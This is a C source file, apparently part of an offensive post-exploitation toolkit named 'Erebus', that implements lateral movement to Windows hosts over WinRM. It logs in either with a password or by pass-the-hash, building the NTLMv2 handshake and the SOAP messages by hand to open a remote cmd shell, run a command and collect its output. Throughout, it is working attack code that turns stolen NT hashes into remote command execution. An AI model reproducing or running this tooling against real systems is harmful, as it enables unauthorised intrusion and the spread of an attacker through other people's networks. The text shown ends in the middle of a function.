/*
 * WinRM lateral: password via WSMan API; PTH via WinHTTP + NTLMv2 + SOAP cmd shell.
 */
#define WIN32_LEAN_AND_MEAN
#define WSMAN_API_VERSION_1_0
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <wsman.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/lateral_impl.h"
#include "erebus/ntlm_pth.h"

#pragma comment(lib, "wsmsvc.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

/* ---- base64 ---- */

static char *b64_encode(const uint8_t *in, size_t in_len) {
    DWORD need = 0;
    if (!CryptBinaryToStringA(in, (DWORD)in_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &need))
        return NULL;
    char *out = (char *)malloc(need);
    if (!out) return NULL;
    if (!CryptBinaryToStringA(in, (DWORD)in_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &need)) {
        free(out);
        return NULL;
    }
    return out;
}

static uint8_t *b64_decode(const char *in, size_t *out_len) {
    DWORD need = 0;
    if (!CryptStringToBinaryA(in, 0, CRYPT_STRING_BASE64, NULL, &need, NULL, NULL))
        return NULL;
    uint8_t *out = (uint8_t *)malloc(need);
    if (!out) return NULL;
    if (!CryptStringToBinaryA(in, 0, CRYPT_STRING_BASE64, out, &need, NULL, NULL)) {
        free(out);
        return NULL;
    }
    *out_len = need;
    return out;
}

static int utf8_to_wide(const char *s, wchar_t **out) {
    if (!s) { *out = NULL; return 0; }
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (n <= 0) return 0;
    *out = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    if (!*out) return 0;
    if (!MultiByteToWideChar(CP_UTF8, 0, s, -1, *out, n)) {
        free(*out); *out = NULL; return 0;
    }
    return 1;
}

/* ---- WSMan password path (existing behavior) ---- */

typedef struct {
    HANDLE done;
    DWORD  error;
    char  *output;
    size_t output_len;
    size_t output_cap;
    int    exit_code;
    int    finished;
} winrm_op_ctx;

static void winrm_append(winrm_op_ctx *ctx, const char *s, size_t n) {
    if (!s || !n) return;
    if (ctx->output_len + n + 1 > ctx->output_cap) {
        size_t ncap = ctx->output_cap ? ctx->output_cap * 2 : 4096;
        while (ncap < ctx->output_len + n + 1) ncap *= 2;
        char *p = (char *)realloc(ctx->output, ncap);
        if (!p) return;
        ctx->output = p;
        ctx->output_cap = ncap;
    }
    memcpy(ctx->output + ctx->output_len, s, n);
    ctx->output_len += n;
    ctx->output[ctx->output_len] = '\0';
}

static void CALLBACK winrm_shell_cb(PVOID operationContext, DWORD flags, WSMAN_ERROR *error,
    WSMAN_SHELL_HANDLE shell, WSMAN_COMMAND_HANDLE command,
    WSMAN_OPERATION_HANDLE operationHandle, WSMAN_RECEIVE_DATA_RESULT *data) {
    (void)shell; (void)command; (void)operationHandle; (void)flags;
    winrm_op_ctx *ctx = (winrm_op_ctx *)operationContext;
    if (!ctx) return;
    if (error && error->code != 0) {
        ctx->error = error->code;
        if (error->errorDetail) {
            int need = WideCharToMultiByte(CP_UTF8, 0, error->errorDetail, -1, NULL, 0, NULL, NULL);
            if (need > 1) {
                char *tmp = (char *)malloc((size_t)need);
                if (tmp) {
                    WideCharToMultiByte(CP_UTF8, 0, error->errorDetail, -1, tmp, need, NULL, NULL);
                    winrm_append(ctx, tmp, strlen(tmp));
                    free(tmp);
                }
            }
        }
    }
    if (data) {
        if (data->streamData.type == WSMAN_DATA_TYPE_BINARY
            && data->streamData.binaryData.data && data->streamData.binaryData.dataLength) {
            winrm_append(ctx, (const char *)data->streamData.binaryData.data,
                data->streamData.binaryData.dataLength);
        } else if (data->streamData.type == WSMAN_DATA_TYPE_TEXT
            && data->streamData.text.buffer && data->streamData.text.bufferLength) {
            int need = WideCharToMultiByte(CP_UTF8, 0, data->streamData.text.buffer,
                (int)data->streamData.text.bufferLength, NULL, 0, NULL, NULL);
            if (need > 0) {
                char *tmp = (char *)malloc((size_t)need + 1);
                if (tmp) {
                    WideCharToMultiByte(CP_UTF8, 0, data->streamData.text.buffer,
                        (int)data->streamData.text.bufferLength, tmp, need, NULL, NULL);
                    tmp[need] = '\0';
                    winrm_append(ctx, tmp, (size_t)need);
                    free(tmp);
                }
            }
        }
        if (data->commandState && wcsstr(data->commandState, L"Done")) {
            ctx->exit_code = (int)data->exitCode;
            ctx->finished = 1;
        }
    }
    SetEvent(ctx->done);
}

static int lateral_winrm_password(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
    *success = 0;
    output[0] = '\0';
    const char *command = cfg->command[0] ? cfg->command : "whoami";

    WSMAN_API_HANDLE api = NULL;
    DWORD rc = WSManInitialize(0, &api);
    if (rc != 0 || !api) {
        snprintf(output, output_cap, "WSManInitialize failed: %lu", (unsigned long)rc);
        return 1;
    }

    wchar_t *wuser = NULL, *wpass = NULL, *wconn = NULL, *wcmd = NULL;
    char userbuf[512];
    if (cfg->domain[0])
        snprintf(userbuf, sizeof(userbuf), "%s\\%s", cfg->domain, cfg->username);
    else
        snprintf(userbuf, sizeof(userbuf), "%s", cfg->username);

    char connbuf[512];
    snprintf(connbuf, sizeof(connbuf), "http://%s:5985", cfg->target);

    if (!utf8_to_wide(userbuf, &wuser) || !utf8_to_wide(cfg->password, &wpass)
        || !utf8_to_wide(connbuf, &wconn) || !utf8_to_wide(command, &wcmd)) {
        snprintf(output, output_cap, "utf16 convert failed");
        WSManDeinitialize(api, 0);
        free(wuser); free(wpass); free(wconn); free(wcmd);
        return 1;
    }

    WSMAN_AUTHENTICATION_CREDENTIALS creds;
    memset(&creds, 0, sizeof(creds));
    creds.authenticationMechanism = WSMAN_FLAG_AUTH_NEGOTIATE;
    creds.userAccount.username = wuser;
    creds.userAccount.password = wpass;

    WSMAN_SESSION_HANDLE session = NULL;
    rc = WSManCreateSession(api, wconn, 0, &creds, NULL, &session);
    if (rc != 0 || !session) {
        snprintf(output, output_cap, "WSManCreateSession failed: %lu", (unsigned long)rc);
        free(wuser); free(wpass); free(wconn); free(wcmd);
        WSManDeinitialize(api, 0);
        return 1;
    }

    {
        WSMAN_DATA opt;
        memset(&opt, 0, sizeof(opt));
        opt.type = WSMAN_DATA_TYPE_DWORD;
        opt.number = 1;
        WSManSetSessionOption(session, WSMAN_OPTION_UNENCRYPTED_MESSAGES, &opt);
    }

    winrm_op_ctx ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.done = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ctx.done) {
        snprintf(output, output_cap, "CreateEvent failed");
        WSManCloseSession(session, 0);
        WSManDeinitialize(api, 0);
        free(wuser); free(wpass); free(wconn); free(wcmd);
        return 1;
    }

    WSMAN_SHELL_ASYNC async;
    memset(&async, 0, sizeof(async));
    async.operationContext = &ctx;
    async.completionFunction = winrm_shell_cb;

    WSMAN_SHELL_HANDLE shell = NULL;
    WSManCreateShell(session, 0, WSMAN_CMDSHELL_URI, NULL, NULL, NULL, &async, &shell);
    if (WaitForSingleObject(ctx.done, 60000) != WAIT_OBJECT_0 || !shell || ctx.error) {
        snprintf(output, output_cap, "WSManCreateShell failed: %lu %s",
            (unsigned long)ctx.error, ctx.output ? ctx.output : "");
        goto cleanup;
    }
    ResetEvent(ctx.done);
    ctx.error = 0;
    free(ctx.output); ctx.output = NULL; ctx.output_len = ctx.output_cap = 0;

    WSMAN_COMMAND_HANDLE cmd = NULL;
    WSManRunShellCommand(shell, 0, wcmd, NULL, NULL, &async, &cmd);
    if (WaitForSingleObject(ctx.done, 60000) != WAIT_OBJECT_0 || !cmd || ctx.error) {
        snprintf(output, output_cap, "WSManRunShellCommand failed: %lu %s",
            (unsigned long)ctx.error, ctx.output ? ctx.output : "");
        goto cleanup_cmd;
    }
    ResetEvent(ctx.done);
    ctx.error = 0;
    free(ctx.output); ctx.output = NULL; ctx.output_len = ctx.output_cap = 0; ctx.finished = 0;

    WSMAN_OPERATION_HANDLE recv_op = NULL;
    WSManReceiveShellOutput(shell, cmd, 0, NULL, &async, &recv_op);
    WaitForSingleObject(ctx.done, 120000);

    if (ctx.output && ctx.output_len) {
        strncpy(output, ctx.output, output_cap - 1);
        output[output_cap - 1] = '\0';
    } else if (ctx.error) {
        snprintf(output, output_cap, "receive failed: %lu", (unsigned long)ctx.error);
    } else {
        snprintf(output, output_cap, "(no output)");
    }
    *success = (ctx.error == 0 && ctx.exit_code == 0);

    if (recv_op) WSManCloseOperation(recv_op, 0);
cleanup_cmd:
    if (cmd) {
        ResetEvent(ctx.done);
        WSManCloseCommand(cmd, 0, &async);
        WaitForSingleObject(ctx.done, 10000);
    }
    if (shell) {
        ResetEvent(ctx.done);
        WSManCloseShell(shell, 0, &async);
        WaitForSingleObject(ctx.done, 10000);
    }
cleanup:
    CloseHandle(ctx.done);
    free(ctx.output);
    WSManCloseSession(session, 0);
    WSManDeinitialize(api, 0);
    free(wuser); free(wpass); free(wconn); free(wcmd);
    return 1;
}

/* ---- WinHTTP + NTLM PTH ---- */

typedef struct {
    HINTERNET session;
    HINTERNET connect;
    char      host[256];
    INTERNET_PORT port;
    char      domain[256];
    char      user[256];
    uint8_t   nt[16];
    int       authed;
} winrm_http_ctx;

static int winhttp_read_all(HINTERNET req, char **body, size_t *body_len, DWORD *status) {
    *body = NULL;
    *body_len = 0;
    DWORD st = 0, st_len = sizeof(st);
    WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &st, &st_len, WINHTTP_NO_HEADER_INDEX);
    if (status) *status = st;

    size_t cap = 0, len = 0;
    char *buf = NULL;
    for (;;) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(req, &avail)) break;
        if (avail == 0) break;
        if (len + avail + 1 > cap) {
            size_t ncap = cap ? cap * 2 : 4096;
            while (ncap < len + avail + 1) ncap *= 2;
            char *nb = (char *)realloc(buf, ncap);
            if (!nb) { free(buf); return 0; }
            buf = nb;
            cap = ncap;
        }
        DWORD rd = 0;
        if (!WinHttpReadData(req, buf + len, avail, &rd) || rd == 0) break;
        len += rd;
    }
    if (buf) buf[len] = '\0';
    *body = buf;
    *body_len = len;
    return 1;
}

static int extract_www_auth_b64(const char *headers, char *out, size_t out_cap) {
    /* Find NTLM or Negotiate <b64> */
    const char *p = headers;
    while (p && *p) {
        const char *line = p;
        const char *nl = strstr(p, "\r\n");
        size_t llen = nl ? (size_t)(nl - p) : strlen(p);
        if (llen > 18) {
            if (_strnicmp(line, "WWW-Authenticate:", 17) == 0) {
                const char *v = line + 17;
                while (*v == ' ') v++;
                const char *scheme = NULL;
                if (_strnicmp(v, "NTLM ", 5) == 0) scheme = v + 5;
                else if (_strnicmp(v, "Negotiate ", 10) == 0) scheme = v + 10;
                if (scheme) {
                    size_t n = 0;
                    while (scheme[n] && scheme[n] != '\r' && scheme[n] != '\n' && scheme[n] != ' ' && n + 1 < out_cap)
                        n++;
                    memcpy(out, scheme, n);
                    out[n] = '\0';
                    return 1;
                }
            }
        }
        p = nl ? nl + 2 : NULL;
    }
    return 0;
}

static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_body, size_t *resp_len, DWORD *status) {
    *resp_body = NULL;
    *resp_len = 0;

    HINTERNET req = WinHttpOpenRequest(ctx->connect, L"POST", L"/wsman", NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!req) return 0;

    WinHttpAddRequestHeaders(req,
        L"Content-Type: application/soap+xml;charset=UTF-8\r\nConnection: Keep-Alive",
        (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);

    size_t soap_len = strlen(soap);

    if (!ctx->authed) {
        /* Leg 1: no auth → 401 */
        if (!WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                (LPVOID)soap, (DWORD)soap_len, (DWORD)soap_len, 0)) {
            WinHttpCloseHandle(req);
            return 0;
        }
        if (!WinHttpReceiveResponse(req, NULL)) {
            WinHttpCloseHandle(req);
            return 0;
        }
        DWORD st = 0;
        char *body1 = NULL;
        size_t bl1 = 0;
        winhttp_read_all(req, &body1, &bl1, &st);
        free(body1);

        if (st != 401) {
            /* maybe no auth needed */
            ctx->authed = 1;
            WinHttpCloseHandle(req);
            req = WinHttpOpenRequest(ctx->connect, L"POST", L"/wsman", NULL,
                WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (!req) return 0;
            WinHttpAddRequestHeaders(req,
                L"Content-Type: application/soap+xml;charset=UTF-8\r\nConnection: Keep-Alive",
                (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
            goto send_final;
        }

        DWORD hdr_len = 0;
        WinHttpQueryHeaders(req, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX,
            WINHTTP_NO_OUTPUT_BUFFER, &hdr_len, WINHTTP_NO_HEADER_INDEX);
        char *hdrs = (char *)malloc(hdr_len + 2);
        if (!hdrs) { WinHttpCloseHandle(req); return 0; }
        if (!WinHttpQueryHeaders(req, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX,
                hdrs, &hdr_len, WINHTTP_NO_HEADER_INDEX)) {
            free(hdrs); WinHttpCloseHandle(req); return 0;
        }
        WinHttpCloseHandle(req);

        /* Type1 */
        uint8_t *t1 = NULL;
        size_t t1_len = 0;
        if (!erebus_ntlm_type1(ctx->domain, &t1, &t1_len)) { free(hdrs); return 0; }
        char *t1b64 = b64_encode(t1, t1_len);
        free(t1);
        if (!t1b64) { free(hdrs); return 0; }

        req = WinHttpOpenRequest(ctx->connect, L"POST", L"/wsman", NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!req) { free(t1b64); free(hdrs); return 0; }
        WinHttpAddRequestHeaders(req,
            L"Content-Type: application/soap+xml;charset=UTF-8\r\nConnection: Keep-Alive",
            (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);

        char auth_hdr[4096];
        /* Prefer NTLM scheme if server offered it */
        const char *scheme = strstr(hdrs, "NTLM") ? "NTLM" : "Negotiate";
        free(hdrs);
        snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: %s %s", scheme, t1b64);
        free(t1b64);

        wchar_t *wauth = NULL;
        if (!utf8_to_wide(auth_hdr, &wauth)) { WinHttpCloseHandle(req); return 0; }
        WinHttpAddRequestHeaders(req, wauth, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
        free(wauth);

        if (!WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                (LPVOID)soap, (DWORD)soap_len, (DWORD)soap_len, 0)
            || !WinHttpReceiveResponse(req, NULL)) {
            WinHttpCloseHandle(req);
            return 0;
        }

        hdr_len = 0;
        WinHttpQueryHeaders(req, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX,
            WINHTTP_NO_OUTPUT_BUFFER, &hdr_len, WINHTTP_NO_HEADER_INDEX);
        hdrs = (char *)malloc(hdr_len + 2);
        if (!hdrs) { WinHttpCloseHandle(req); return 0; }
        if (!WinHttpQueryHeaders(req, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX,
                hdrs, &hdr_len, WINHTTP_NO_HEADER_INDEX)) {
            free(hdrs); WinHttpCloseHandle(req); return 0;
        }
        char *body2 = NULL;
        size_t bl2 = 0;
        winhttp_read_all(req, &body2, &bl2, &st);
        free(body2);
        WinHttpCloseHandle(req);

        char chal_b64[4096];
        if (!extract_www_auth_b64(hdrs, chal_b64, sizeof(chal_b64))) {
            free(hdrs);
            return 0;
        }
        free(hdrs);

        size_t chal_len = 0;
        uint8_t *chal = b64_decode(chal_b64, &chal_len);
        if (!chal) return 0;

        uint8_t *t3 = NULL;
        size_t t3_len = 0;
        if (!erebus_ntlm_type3_hash(chal, chal_len, ctx->user, ctx->domain, ctx->nt, &t3, &t3_len)) {
            free(chal);
            /* Caller surfaces via status/empty; type2 parse or crypto failed. */
            return 0;
        }

        free(chal);
        char *t3b64 = b64_encode(t3, t3_len);
        free(t3);
        if (!t3b64) return 0;

        req = WinHttpOpenRequest(ctx->connect, L"POST", L"/wsman", NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!req) { free(t3b64); return 0; }
        WinHttpAddRequestHeaders(req,
            L"Content-Type: application/soap+xml;charset=UTF-8\r\nConnection: Keep-Alive",
            (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
        snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: %s %s", scheme, t3b64);
        free(t3b64);
        if (!utf8_to_wide(auth_hdr, &wauth)) { WinHttpCloseHandle(req); return 0; }
        WinHttpAddRequestHeaders(req, wauth, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
        free(wauth);
        ctx->authed = 1;
    }

send_final:
    if (!WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)soap, (DWORD)soap_len, (DWORD)soap_len, 0)
        || !WinHttpReceiveResponse(req, NULL)) {
        WinHttpCloseHandle(req);
        return 0;
    }
    DWORD st = 0;
    if (!winhttp_read_all(req, resp_body, resp_len, &st)) {
        WinHttpCloseHandle(req);
        return 0;
    }
    if (status) *status = st;
    WinHttpCloseHandle(req);
    return 1;
}

static void xml_escape(const char *in, char *out, size_t out_cap) {
    size_t o = 0;
    for (size_t i = 0; in[i] && o + 6 < out_cap; i++) {
        char c = in[i];
        if (c == '<') { memcpy(out + o, "&lt;", 4); o += 4; }
        else if (c == '>') { memcpy(out + o, "&gt;", 4); o += 4; }
        else if (c == '&') { memcpy(out + o, "&amp;", 5); o += 5; }
        else if (c == '"') { memcpy(out + o, "&quot;", 6); o += 6; }
        else out[o++] = c;
    }
    out[o] = '\0';
}

static void make_uuid(char *out, size_t cap) {
    uint8_t b[16];
    BCryptGenRandom(NULL, b, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    snprintf(out, cap, "uuid:%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
        b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]);
}

static int extract_xml_tag(const char *xml, const char *tag, char *out, size_t out_cap) {
    char open[128];
    snprintf(open, sizeof(open), "<%s", tag);
    const char *p = strstr(xml, open);
    if (!p) {
        /* try with namespace prefix rsp: */
        snprintf(open, sizeof(open), ":%s", tag);
        p = strstr(xml, open);
        if (!p) return 0;
        /* find '<' before */
        while (p > xml && *p != '<') p--;
    }
    p = strchr(p, '>');
    if (!p) return 0;
    p++;
    char close[128];
    snprintf(close, sizeof(close), "</%s>", tag);
    const char *e = strstr(p, close);
    if (!e) {
        snprintf(close, sizeof(close), "</rsp:%s>", tag);
        e = strstr(p, close);
    }
    if (!e) return 0;
    size_t n = (size_t)(e - p);
    if (n >= out_cap) n = out_cap - 1;
    memcpy(out, p, n);
    out[n] = '\0';
    return 1;
}

static int lateral_winrm_pth(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
    *success = 0;
    output[0] = '\0';

    if (!cfg->target[0]) {
        snprintf(output, output_cap, "winrm PTH requires target host");
        return 1;
    }
    if (!cfg->username[0] || !cfg->ntlm_hash[0]) {
        snprintf(output, output_cap, "winrm PTH requires username and ntlm_hash (32 hex NT or LM:NT)");
        return 1;
    }

    winrm_http_ctx ctx;
    memset(&ctx, 0, sizeof(ctx));
    snprintf(ctx.host, sizeof(ctx.host), "%s", cfg->target);
    ctx.port = 5985;
    erebus_ntlm_split_user(cfg->username, cfg->domain, ctx.domain, sizeof(ctx.domain),
        ctx.user, sizeof(ctx.user));
    if (!ctx.user[0]) {
        snprintf(output, output_cap, "winrm PTH: could not parse username");
        return 1;
    }
    if (!erebus_ntlm_parse_hash(cfg->ntlm_hash, ctx.nt)) {
        snprintf(output, output_cap, "invalid ntlm_hash (need 32 hex NT or LM:NT)");
        return 1;
    }

    ctx.session = WinHttpOpen(L"Erebus", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ctx.session) {
        snprintf(output, output_cap, "WinHttpOpen failed: %lu", (unsigned long)GetLastError());
        return 1;
    }
    /* Single connection for NTLM multi-leg */
    DWORD max_conn = 1;
    WinHttpSetOption(ctx.session, WINHTTP_OPTION_MAX_CONNS_PER_SERVER, &max_conn, sizeof(max_conn));

    wchar_t whost[256];
    MultiByteToWideChar(CP_UTF8, 0, ctx.host, -1, whost, 256);
    ctx.connect = WinHttpConnect(ctx.session, whost, ctx.port, 0);
    if (!ctx.connect) {
        snprintf(output, output_cap, "WinHttpConnect failed: %lu", (unsigned long)GetLastError());
        WinHttpCloseHandle(ctx.session);
        return 1;
    }

    char msg_id[80], shell_url[512], cmd_esc[4096];
    make_uuid(msg_id, sizeof(msg_id));
    const char *command = cfg->command[0] ? cfg->command : "whoami";
    xml_escape(command, cmd_esc, sizeof(cmd_esc));

    char soap[8192];
    snprintf(soap, sizeof(soap),
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" "
        "xmlns:p=\"http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\" "
        "xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
        "<s:Header>"
        "<a:To>http://%s:%u/wsman</a:To>"
        "<a:ReplyTo><a:Address mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>"
        "<w:ResourceURI mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>"
        "<a:Action mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>"
        "<w:MaxEnvelopeSize mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>"
        "<a:MessageID>%s</a:MessageID>"
        "<w:OperationTimeout>PT60S</w:OperationTimeout>"
        "</s:Header>"
        "<s:Body><rsp:Shell><rsp:InputStreams>stdin</rsp:InputStreams>"
        "<rsp:OutputStreams>stdout stderr</rsp:OutputStreams></rsp:Shell></s:Body>"
        "</s:Envelope>",
        ctx.host, (unsigned)ctx.port, msg_id);

    char *resp = NULL;
    size_t resp_len = 0;
    DWORD st = 0;
    if (!winrm_http_post(&ctx, soap, &resp, &resp_len, &st) || !resp) {
        snprintf(output, output_cap,
            "winrm PTH create shell failed (NTLM/HTTP); user=%s domain=%s host=%s — check hash form, SPN reachability, port 5985",
            ctx.user, ctx.domain[0] ? ctx.domain : "(empty)", ctx.host);
        WinHttpCloseHandle(ctx.connect);
        WinHttpCloseHandle(ctx.session);
        return 1;
    }
    if (st != 200) {
        snprintf(output, output_cap,
            "winrm PTH create shell HTTP %lu (401=bad hash/auth; 500=soap) user=%s domain=%s: %.160s",
            (unsigned long)st, ctx.user, ctx.domain[0] ? ctx.domain : "(empty)", resp);
        free(resp);
        WinHttpCloseHandle(ctx.connect);
        WinHttpCloseHandle(ctx.session);
        return 1;
    }

    /* ShellId */
    char shell_id[256];
    if (!extract_xml_tag(resp, "ShellId", shell_id, sizeof(shell_id))) {
        snprintf(output, output_cap, "winrm PTH: no ShellId in response");
        free(resp);
        WinHttpCloseHandle(ctx.connect);
        WinHttpCloseHandle(ctx.session);
        return 1;
    }
    free(resp);

    /* SelectorSet resource URI for command */
    make_uuid(msg_id, sizeof(msg_id));
    snprintf(soap, sizeof(soap),
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" "
        "xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
        "<s:Header>"
        "<a:To>http://%s:%u/wsman</a:To>"
        "<a:ReplyTo><a:Address mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>"
        "<w:ResourceURI mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>"
        "<a:Action mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>"
        "<w:MaxEnvelopeSize mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>"
        "<a:MessageID>%s</a:MessageID>"
        "<w:SelectorSet><w:Selector Name=\"ShellId\">%s</w:Selector></w:SelectorSet>"
        "<w:OperationTimeout>PT60S</w:OperationTimeout>"
        "</s:Header>"
        "<s:Body><rsp:CommandLine><rsp:Command>%s</rsp:Command></rsp:CommandLine></s:Body>"
        "</s:Envelope>",
        ctx.host, (unsigned)ctx.port, msg_id, shell_id, cmd_esc);

    if (!winrm_http_post(&ctx, soap, &resp, &resp_len, &st) || !resp) {
        snprintf(output, output_cap, "winrm PTH command transport failed");
        WinHttpCloseHandle(ctx.connect);
        WinHttpCloseHandle(ctx.session);
        return 1;
    }
    char cmd_id[256];
    if (st != 200 || !extract_xml_tag(resp, "CommandId", cmd_id, sizeof(cmd_id))) {
        snprintf(output, output_cap, "winrm PTH command failed HTTP %lu: %.200s",
            (unsigned long)st, resp ? resp : "");
        free(resp);
        WinHttpCloseHandle(ctx.connect);
        WinHttpCloseHandle(ctx.session);
        return 1;
    }
    free(resp);

    make_uuid(msg_id, sizeof(msg_id));
    snprintf(soap, sizeof(soap),
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" "
        "xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
        "<s:Header>"
        "<a:To>http://%s:%u/wsman</a:To>"
        "<a:ReplyTo><a:Address mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>"
        "<w:ResourceURI mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>"
        "<a:Action mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>"
        "<w:MaxEnvelopeSize mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>"
        "<a:MessageID>%s</a:MessageID>"
        "<w:SelectorSet><w:Selector Name=\"ShellId\">%s</w:Selector></w:SelectorSet>"
        "<w:OperationTimeout>PT60S</w:OperationTimeout>"
        "</s:Header>"
        "<s:Body><rsp:Receive><rsp:DesiredStream CommandId=\"%s\">stdout stderr</rsp:DesiredStream></rsp:Receive></s:Body>"
        "</s:Envelope>",
        ctx.host, (unsigned)ctx.port, msg_id, shell_id, cmd_id);

    if (!winrm_http_post(&ctx, soap, &resp, &resp_len, &st) || !resp) {
        snprintf(output, output_cap, "winrm PTH receive transport failed");
        WinHttpCloseHandle(ctx.connect);
        WinHttpCloseHandle(ctx.session);
        return 1;
    }

    /* Stream text may be base64 */
    char stream[32768];
    if (extract_xml_tag(resp, "Stream", stream, sizeof(stream))) {
        size_t dlen = 0;
        uint8_t *dec = b64_decode(stream, &dlen);
        if (dec && dlen) {
            size_t copy = dlen < output_cap - 1 ? dlen : output_cap - 1;
            memcpy(output, dec, copy);
            output[copy] = '\0';
            free(dec);
            *success = 1;
        } else {
            strncpy(output, stream, output_cap - 1);
            *success = 1;
        }
    } else {
        snprintf(output, output_cap, "winrm PTH receive HTTP %lu (no stream): %.300s",
            (unsigned long)st, resp);
        *success = (st == 200);
    }
    free(resp);

    /* best-effort delete shell */
    make_uuid(msg_id, sizeof(msg_id));
    snprintf(soap, sizeof(soap),
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\">"
        "<s:Header>"
        "<a:To>http://%s:%u/wsman</a:To>"
        "<w:ResourceURI mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>"
        "<a:Action mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action>"
        "<a:MessageID>%s</a:MessageID>"
        "<w:SelectorSet><w:Selector Name=\"ShellId\">%s</w:Selector></w:SelectorSet>"
        "</s:Header><s:Body/>"
        "</s:Envelope>",
        ctx.host, (unsigned)ctx.port, msg_id, shell_id);
    char *ignore = NULL;
    size_t il = 0;
    winrm_http_post(&ctx, soap, &ignore, &il, &st);
    free(ignore);

    (void)shell_url;
    WinHttpCloseHandle(ctx.connect);
    WinHttpCloseHandle(ctx.session);
    return 1;
}

int erebus_lateral_winrm(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
